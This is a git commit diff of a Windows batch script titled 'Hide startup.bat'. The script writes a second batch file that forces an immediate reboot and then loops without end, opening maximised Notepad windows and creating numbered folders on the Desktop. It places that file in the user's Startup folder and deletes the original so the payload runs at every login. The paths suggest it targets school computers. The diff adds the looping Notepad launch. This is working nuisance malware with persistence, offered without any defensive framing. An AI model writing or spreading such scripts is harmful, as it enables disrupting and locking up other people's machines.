78a3cf7f35883d76e30a34f3750ace92b32b492a
MarkasMark567 <113364058+MarkasMark567@users.noreply.github.com>
2022-11-03 20:28:40 -0400

    Update Hide startup.bat

--- Hide startup.bat
+++ Hide startup.bat
@@ -1,13 +1,16 @@
+REM Creating a file with code
 (
 echo shutdown /r /t 0
 echo set /a num=1
-echo :a
 echo cd C:\Users\%username%\Desktop
 echo cd C:\Users\%username%\OneDrive - Fairfax County Public Schools\Desktop
+echo :a
+echo start notepad /max
 echo md LLLL_%%num%%
 echo num=%%num%%+1
 echo goto a
 ) > File.bat
+REM Copying it to startup and then deleting the original
 COPY "File.bat" "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 del File.bat /q
 cd "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
